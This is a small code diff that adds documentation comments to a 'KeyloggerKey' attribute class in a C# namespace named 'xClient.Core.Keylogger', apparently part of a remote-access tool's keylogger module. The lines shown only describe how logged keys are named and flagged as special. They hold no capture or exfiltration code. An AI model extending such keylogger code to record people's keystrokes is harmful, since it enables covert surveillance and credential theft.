@@ -7,7 +7,15 @@ namespace xClient.Core.Keylogger
     [AttributeUsage(AttributeTargets.Enum, AllowMultiple = false)]
     public class KeyloggerKey : Attribute
     {
+        /// <summary>
+        /// The appearance of the logged key.
+        /// </summary>
         public string KeyName { get; private set; }
+        /// <summary>
+        /// Tells the Logger that this key is handled in a special way.
+        /// </summary>
+        // Please note that "Special Keys" will be colored in a different
+        // way by the Logger.
         public bool IsSpecialKey { get; private set; }
 
         /// <summary>
